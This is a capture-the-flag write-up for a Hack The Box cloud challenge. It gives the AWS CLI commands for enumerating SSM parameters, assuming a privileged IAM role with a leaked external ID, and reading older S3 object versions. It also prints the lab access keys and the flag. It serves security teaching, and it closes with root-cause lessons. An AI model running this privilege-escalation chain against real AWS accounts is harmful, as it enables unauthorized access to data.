# False Ferry — HTB Cloud CTF Writeup

**Category:** Cloud (AWS / LocalStack)
**Flag:** `HTB{ferry_crossing_dock_seal_de433120b6295dc593c51b7de156f4cf}`
**Vuln chain:** SSM Parameter Store discovery → IAM `AssumeRole` pivot (external-id / confused deputy) → S3 object versioning

---

## Scenario

> Lysa Harrowmere must find the *earlier* crossing list, prove who changed the dock, and get the soldiers onto the right boat before Vaultrune cuts the road.

Two Docker instances are provided:

- `154.57.164.71:30733` — an AWS API endpoint (LocalStack; internal `127.0.0.1:4566`)
- `154.57.164.71:30586` — a briefing web app (`PhoenixBriefing/1.0`)

**Narrative → technical mapping**

| Story element | Real meaning |
|---|---|
| Route board says east road, roster sends to Vaultrune | Current object version was tampered to repoint the "dock" |
| Find the earlier crossing list | Read an earlier **S3 object version** |
| Prove who changed the dock | Version history / metadata shows the swap |
| Ferry clerk access | Low-priv IAM identity (long-lived key) |
| Get soldiers on the right boat | Reach the genuine/authorized manifest version holding the flag |

Throughout, `EP=http://154.57.164.71:30733` is the AWS endpoint.

---

## Step 1 — Fingerprint both instances

```bash
for p in 30733 30586; do echo "=== :$p ==="; curl -sS -i "http://154.57.164.71:$p/" | head -40; done
```

- `:30733` returns `AccessDeniedException` / `MissingAuthentication` with `x-amz-request-id` headers → an **unsigned AWS API call**. It's an AWS mock (LocalStack), not a blocked port.
- `:30586` is the briefing app. Its HTML spells out the intended path:

> Crossing batch metadata lives in Systems Manager under `/ferry/crossing/`. Catalog the namespace before you read any parameter value.

That "catalog before you read" line is a direct hint that `GetParametersByPath` is denied and you must use `DescribeParameters`.

## Step 2 — Grab the clerk credentials

The page links `/player-creds.json`:

```bash
curl -sS http://154.57.164.71:30586/player-creds.json
```

```json
{
  "user": "coalition-ferry-clerk",
  "access_key_id": "AKIA...",
  "secret_access_key": "...",
  "region": "us-east-1",
  "endpoint": "http://127.0.0.1:4566"
}
```

Long-lived `AKIA` key (no session token). Load it:

```bash
export AWS_ACCESS_KEY_ID=AKIA0AYPEBYYLROQNSFS
export AWS_SECRET_ACCESS_KEY='JWwLZOpoN5Rf80o8hvs7wJnKkRKbtaCXkglxrS1+'
unset AWS_SESSION_TOKEN
export AWS_DEFAULT_REGION=us-east-1
EP=http://154.57.164.71:30733
```

## Step 3 — Fix clock skew (gotcha)

First SSM call returned:

```
An error occurred (RequestExpiredException) ... Request is expired.
```

The VM (VirtualBox/Parrot) clock had drifted ~3h ahead of the server, so the SigV4 timestamp fell outside the allowed window. Sync to the server's `Date` header:

```bash
sudo date -s "$(curl -sSI http://154.57.164.71:30586/ | grep -i '^date:' | cut -d' ' -f2-)"
```

> If you later get `RequestExpired` again, re-run this before the next call — SigV4 (and any temporary session token) is time-bound.

## Step 4 — Catalog the SSM namespace

`GetParametersByPath` is denied for the clerk — fall back to `DescribeParameters` (the "catalog" action):

```bash
aws ssm describe-parameters --endpoint-url $EP \
  --query 'Parameters[].{Name:Name,Type:Type,Ver:Version,User:LastModifiedUser}' --output table
```

```
/ferry/crossing/live-crossing-id
/ferry/crossing/CROSSING-VOID-9B11
/ferry/crossing/CROSSING-CLOSED-5E22
/ferry/crossing/CROSSING-DRAFT-8D40
/ferry/crossing/CROSSING-VOID-3C21
/ferry/crossing/CROSSING-7A3F
/ferry/crossing/CROSSING-VOID-1A04
/ferry/crossing/CROSSING-VOID-2D77
```

Most parameters carry a disqualifying status (`VOID`, `CLOSED`, `DRAFT`). Two are unmarked: `live-crossing-id` (the "board" pointer) and `CROSSING-7A3F` (the one active crossing).

## Step 5 — Read the authorized crossing

`GetParameter` works even though `GetParameters` (plural) is denied:

```bash
aws ssm get-parameter --endpoint-url $EP --name /ferry/crossing/live-crossing-id \
  --query 'Parameter.Value' --output text
# -> CROSSING-7A3F

aws ssm get-parameter --endpoint-url $EP --name /ferry/crossing/CROSSING-7A3F \
  --query 'Parameter.Value' --output text
```

```json
{
  "crossing_id": "CROSSING-7A3F",
  "status": "AUTHORIZED",
  "scanner_role_arn": "arn:aws:iam::584729103648:role/ferry-crossing-scanner",
  "scanner_external_id": "ferry-crossing-scanner-7a3f",
  "manifest_bucket": "ferry-crossing-manifest",
  "manifest_object_key": "manifests/morning-crossing-order.txt",
  "manifest_version_id": "6b30d96c-7e33-4f64-b11a-6ac95be699a6",
  "record_type": "crossing_manifest"
}
```

This one parameter hands over the entire rest of the chain: the target **S3 bucket + key**, a **pinned `manifest_version_id`**, and an **IAM role + external id** to reach it.

## Step 6 — Pivot: assume the scanner role

The clerk has no S3 access:

```
An error occurred (AccessDenied) ... s3:ListBucketVersions
```

The AUTHORIZED crossing provides exactly the assume-role material (role ARN + matching external id — a confused-deputy-style pivot):

```bash
aws sts assume-role --endpoint-url $EP \
  --role-arn arn:aws:iam::584729103648:role/ferry-crossing-scanner \
  --role-session-name lysa --external-id ferry-crossing-scanner-7a3f
```

Export the returned temporary credentials:

```bash
export AWS_ACCESS_KEY_ID=ASIA...        # from Credentials.AccessKeyId
export AWS_SECRET_ACCESS_KEY=...        # Credentials.SecretAccessKey
export AWS_SESSION_TOKEN=...            # Credentials.SessionToken

aws sts get-caller-identity --endpoint-url $EP
# -> arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/lysa
```

> Temp creds are short-lived (here ~15 min). If they expire, re-run `assume-role` and re-export.

## Step 7 — S3 object versioning → the flag

As the scanner, list every version of the manifest:

```bash
aws s3api list-object-versions --endpoint-url $EP --bucket ferry-crossing-manifest \
  --prefix manifests/morning-crossing-order.txt \
  --query 'Versions[].{Ver:VersionId,Latest:IsLatest,Mod:LastModified}' --output table
```

| Latest | VersionId |
|---|---|
| True  | `2e5a0cfe-…` (tampered "emergency-release") |
| False | `6b30d96c-…` (**authorized — pinned by CROSSING-7A3F**) |
| False | `ad439560-…` (unsigned draft) |

Dump all three:

```bash
for VID in 2e5a0cfe-d5b5-4cda-80f7-4f23cdbc61c2 \
           6b30d96c-7e33-4f64-b11a-6ac95be699a6 \
           ad439560-24ad-4c7b-8705-1629cbd3bead; do
  echo "===== $VID ====="
  aws s3api get-object --endpoint-url $EP --bucket ferry-crossing-manifest \
    --key manifests/morning-crossing-order.txt --version-id "$VID" "/tmp/m-$VID.txt" >/dev/null
  cat "/tmp/m-$VID.txt"; echo
done
```

**Results:**

- `2e5a0cfe…` (Latest): "emergency-release" pointing at `CROSSING-VOID-9B11` → **the tamper / Vaultrune's dock**
- `6b30d96c…` (pinned/authorized): the genuine record → **contains the flag**
- `ad439560…`: unsigned draft `AWAITING_CROSSING_SIGNATURE`

```
CROSSING RELEASE RECORD
Batch: CROSSING-7A3F
Authorized by: Stormbound Coalition Ferry Office
HTB{ferry_crossing_dock_seal_de433120b6295dc593c51b7de156f4cf}
```

---

## Flag

```
HTB{ferry_crossing_dock_seal_de433120b6295dc593c51b7de156f4cf}
```

## Root cause / lessons

- **Least privilege gaps in SSM:** the clerk could `DescribeParameters` + `GetParameter`, enough to enumerate the namespace and read an AUTHORIZED record that leaked bucket paths, a pinned version id, and role-assumption material.
- **Confused-deputy assume-role:** the `external_id` needed to assume the higher-priv `ferry-crossing-scanner` role was stored in a parameter the low-priv identity could read. External IDs are meant to prevent confused-deputy abuse — here it was handed to the attacker.
- **S3 object versioning:** the tamper overwrote the object with a new *latest* version, but the authorized version (and the original draft) remained retrievable. The "current" view is not the whole truth when versioning is enabled — always walk `list-object-versions`.

## Gotchas encountered

1. `RequestExpiredException` → VM clock skew; sync to the server `Date` header.
2. `GetParametersByPath` / `GetParameters` denied, but `DescribeParameters` + `GetParameter` (singular) allowed — hence the "catalog first" hint.
3. Direct S3 denied for the clerk — the intended path is the role pivot, not the clerk creds.
